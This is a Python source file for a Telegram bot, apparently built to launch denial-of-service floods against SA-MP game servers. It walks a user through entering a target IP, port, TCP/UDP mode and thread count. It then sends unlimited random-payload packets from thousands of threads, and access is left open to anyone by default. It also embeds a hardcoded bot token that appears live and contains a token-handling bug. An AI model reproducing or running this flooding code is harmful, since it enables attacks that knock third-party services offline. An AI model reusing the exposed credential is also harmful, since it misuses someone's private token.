import os
import random
import socket
import threading
import time
import sys
import telebot

# Get token from environment variable
BOT_TOKEN ='8462382934:AAF_dC1yr5YZjXZpTp0FXYWdZaLtuy8F8d0'
if not BOT_TOKEN:
    print("Error: BOT_TOKEN environment variable not set!")
    sys.exit(1)

bot = telebot.TeleBot('BOT_TOKEN')

# Global variables
user_data = {}
attack_threads = {}
attack_running = {}

# Admin/Authorized user IDs
AUTHORIZED_USERS = []  # Add user IDs as integers

def is_authorized(user_id):
    if not AUTHORIZED_USERS:
        return True
    return user_id in AUTHORIZED_USERS

@bot.message_handler(commands=['start'])
def send_welcome(message):
    if not is_authorized(message.from_user.id):
        bot.reply_to(message, "You are not authorized to use this bot.")
        return
    
    welcome_text = """YORODA HAMADA

Security / Network Tool
Mode: DDOS (SA-MP) 
Codename: Ddos Bot Net Samp

Operator: Yoroda Hamada

Commands:
/start - Show this menu
/attack - Start attack
/stop - Stop attack
/status - Check attack status
/help - Show help menu

Use /attack to begin configuration"""
    bot.reply_to(message, welcome_text)

@bot.message_handler(commands=['help'])
def send_help(message):
    if not is_authorized(message.from_user.id):
        bot.reply_to(message, "You are not authorized to use this bot.")
        return
    
    help_text = """Help Menu

How to use:
1. Use /attack to start
2. Enter target IP/Host
3. Enter target port
4. Choose attack type: TCP or UDP
5. Enter thread count (100-5000)

Note: Unlimited packets - attack runs continuously!

Commands:
/start - Main menu
/attack - Start new attack
/stop - Stop current attack
/status - Check attack status
/help - Show this menu"""
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['attack'])
def start_attack(message):
    if not is_authorized(message.from_user.id):
        bot.reply_to(message, "You are not authorized to use this bot.")
        return
    
    user_id = message.from_user.id
    
    # Check if attack is already running
    if user_id in attack_running and attack_running[user_id]:
        bot.reply_to(message, "Attack already running!\nUse /stop to stop the current attack.")
        return
    
    user_data[user_id] = {}
    user_data[user_id]['step'] = 'ip'
    
    bot.reply_to(message, """Target Profile

Setup Attack
Please enter the target IP/Host:
(Example: 127.0.0.1 or example.com)

Reply with the IP address.""")

@bot.message_handler(func=lambda message: True)
def handle_messages(message):
    user_id = message.from_user.id
    
    if not is_authorized(user_id):
        bot.reply_to(message, "You are not authorized to use this bot.")
        return
    
    if user_id not in user_data:
        return
    
    step = user_data[user_id].get('step')
    
    if step == 'ip':
        user_data[user_id]['ip'] = message.text.strip()
        user_data[user_id]['step'] = 'port'
        bot.reply_to(message, f"""IP Set: {user_data[user_id]['ip']}

Service Port
Please enter the target port:
(SA-MP default: 7777)

Reply with the port number.""")
    
    elif step == 'port':
        try:
            port = int(message.text.strip())
            user_data[user_id]['port'] = port
            user_data[user_id]['step'] = 'attack_type'
            bot.reply_to(message, f"""Port Set: {port}

Attack Type
Please choose attack type:
Reply with 'tcp' for TCP attack
Reply with 'udp' for UDP attack
Reply with 'both' for both TCP and UDP""")
        except ValueError:
            bot.reply_to(message, "Invalid port number. Please enter a valid number.")
    
    elif step == 'attack_type':
        attack_type = message.text.strip().lower()
        if attack_type in ['tcp', 'udp', 'both']:
            user_data[user_id]['attack_type'] = attack_type
            user_data[user_id]['step'] = 'threads'
            bot.reply_to(message, f"""Attack Type Set: {attack_type.upper()}

Threads
Please enter the number of threads:
(Recommended: 100-5000)

Note: Unlimited packets - attack runs continuously!

Reply with the thread count.""")
        else:
            bot.reply_to(message, "Invalid choice. Please reply with 'tcp', 'udp', or 'both'.")
    
    elif step == 'threads':
        try:
            threads = int(message.text.strip())
            if threads < 1:
                bot.reply_to(message, "Threads must be greater than 0.")
                return
            user_data[user_id]['threads'] = threads
            user_data[user_id]['step'] = 'confirm'
            
            # Show summary
            summary = f"""ATTACK CONFIGURATION

Target Profile
IP: {user_data[user_id]['ip']}
Port: {user_data[user_id]['port']}
Attack Type: {user_data[user_id]['attack_type'].upper()}
Threads: {user_data[user_id]['threads']}
Packets: UNLIMITED

Status
Ready to start attack.

Reply with 'y' to start the attack or 'n' to cancel."""
            bot.reply_to(message, summary)
            
        except ValueError:
            bot.reply_to(message, "Invalid number. Please enter a valid number.")
    
    elif step == 'confirm':
        if message.text.strip().lower() == 'y':
            # Start the attack
            ip = user_data[user_id]['ip']
            port = user_data[user_id]['port']
            attack_type = user_data[user_id]['attack_type']
            threads = user_data[user_id]['threads']
            
            # Mark attack as running
            attack_running[user_id] = True
            
            bot.reply_to(message, f"""ATTACK STARTED

Target: {ip}:{port}
Attack Type: {attack_type.upper()}
Threads: {threads}
Packets: UNLIMITED

Status: Running...
Use /stop to stop the attack.""")
            
            # Start attack threads
            start_attack_threads(user_id, ip, port, attack_type, threads)
            
        else:
            bot.reply_to(message, "Attack cancelled. Use /attack to start a new one.")
            del user_data[user_id]

def start_attack_threads(user_id, ip, port, attack_type, threads):
    """Start unlimited attack threads - Same as original Layer4_UDP.py"""
    
    # UDP Attack - Same as original xxxx()
    def udp_attack():
        data = random._urandom(998)
        while attack_running.get(user_id, False):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                addr = (str(ip), int(port))
                while attack_running.get(user_id, False):
                    s.sendto(data, addr)
            except:
                pass
    
    # TCP Attack - Same as original xx()
    def tcp_attack():
        data = random._urandom(871)
        while attack_running.get(user_id, False):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, port))
                while attack_running.get(user_id, False):
                    s.send(data)
                s.close()
            except:
                pass
    
    # Store threads for cleanup
    attack_threads[user_id] = []
    
    # Start threads - Same as original pattern
    if attack_type == 'udp':
        for _ in range(threads):
            t = threading.Thread(target=udp_attack)
            t.daemon = True
            t.start()
            attack_threads[user_id].append(t)
    
    elif attack_type == 'tcp':
        for _ in range(threads):
            t = threading.Thread(target=tcp_attack)
            t.daemon = True
            t.start()
            attack_threads[user_id].append(t)
    
    elif attack_type == 'both':
        for _ in range(threads // 2):
            t1 = threading.Thread(target=udp_attack)
            t1.daemon = True
            t1.start()
            attack_threads[user_id].append(t1)
            
            t2 = threading.Thread(target=tcp_attack)
            t2.daemon = True
            t2.start()
            attack_threads[user_id].append(t2)
        
        if threads % 2 != 0:
            t = threading.Thread(target=udp_attack)
            t.daemon = True
            t.start()
            attack_threads[user_id].append(t)

@bot.message_handler(commands=['stop'])
def stop_attack(message):
    if not is_authorized(message.from_user.id):
        bot.reply_to(message, "You are not authorized to use this bot.")
        return
    
    user_id = message.from_user.id
    
    if user_id in attack_running and attack_running[user_id]:
        attack_running[user_id] = False
        
        if user_id in attack_threads:
            attack_threads[user_id] = []
        
        bot.reply_to(message, """ATTACK STOPPED

The attack has been stopped.

To start a new attack, use /attack""")
    else:
        bot.reply_to(message, "No active attack to stop.\nUse /attack to start one.")

@bot.message_handler(commands=['status'])
def check_status(message):
    if not is_authorized(message.from_user.id):
        bot.reply_to(message, "You are not authorized to use this bot.")
        return
    
    user_id = message.from_user.id
    is_running = attack_running.get(user_id, False)
    
    status_text = f"""System Status

Bot Status: Online

Active Attacks: {'Running' if is_running else 'No active attack'}

Attack Details
Operator: Yoroda Hamada
Version: v1.0
Mode: DDOS (SA-MP) THAILAND
Packets: UNLIMITED
Threading: {threading.active_count()} active threads

Use /attack to start a new attack.
Use /stop to stop the current attack."""
    bot.reply_to(message, status_text)

if __name__ == "__main__":
    print("Yoroda Hamada's Telegram Bot is starting...")
    print("Bot is running. Press Ctrl+C to stop.")
    print("Unlimited attack mode enabled!")
    print("Attack types: TCP, UDP, or BOTH")
    try:
        bot.polling(none_stop=True, timeout=60)
    except Exception as e:
        print(f"Error: {e}")
